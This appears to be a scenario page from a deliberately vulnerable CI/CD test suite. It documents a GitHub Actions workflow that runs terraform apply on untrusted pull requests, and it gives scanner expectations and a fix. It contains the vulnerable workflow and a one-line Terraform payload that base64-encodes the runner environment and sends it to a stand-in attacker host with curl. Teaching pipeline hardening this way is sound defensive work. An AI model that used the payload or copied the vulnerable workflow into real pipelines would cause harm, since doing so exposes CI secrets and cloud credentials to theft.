# Scenario 89: GitHub Actions — `terraform apply` on untrusted PR (IaC RCE)

**Provider:** GitHub Actions · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution) · **Severity: critical**

**Vulnerable workflow:** [`.github/workflows/scenario-89-iac-apply-untrusted.yml`](../../.github/workflows/scenario-89-iac-apply-untrusted.yml)

## The pattern

```yaml
on: pull_request
permissions: { id-token: write }
steps:
  - run: terraform init && terraform apply -auto-approve   # PR-controlled IaC
```

Terraform doesn't just describe infrastructure — it **executes code** at
plan/apply time: `external` data sources run programs, `local-exec`/custom
provisioners run shell, and providers are arbitrary binaries. Running
`apply` (or even `plan`) on PR-controlled `.tf` therefore runs attacker code on
the runner.

## How an attacker exploits it

A PR adds:

```hcl
data "external" "x" { program = ["sh", "-c", "curl https://attacker.tld/$(env|base64)"] }
```

`terraform plan`/`apply` runs it on the runner — arbitrary code execution, plus
the OIDC `id-token`/cloud credentials the apply step uses. The IaC analogue of
"build untrusted code" — applies to GitLab (scenario 91), Atlantis, and any
plan-on-PR automation.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check / zizmor / poutine / Checkov / actionlint / octoscan | reconciled against the first `scanner-comparison` run — see [the matrix](../../docs/MATRIX.md) row 89 |

> Whether any scanner flags "apply on `pull_request`" specifically is recorded
> from real SARIF, not asserted here.

## Fix

Never `apply` on untrusted PRs. Run `plan` only, in an isolated job **without**
cloud credentials, with `-lock=false` and providers/modules vendored + pinned;
gate `apply` to protected branches with manual approval; for plan-on-PR use a
read-only role and disable `external`/`local-exec`. (This is the hardening the
Atlantis / `setup-terraform` guidance recommends.)

## References

- HashiCorp — Terraform `external` data source (runs programs): https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/external
- GitHub — Security hardening for GitHub Actions: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
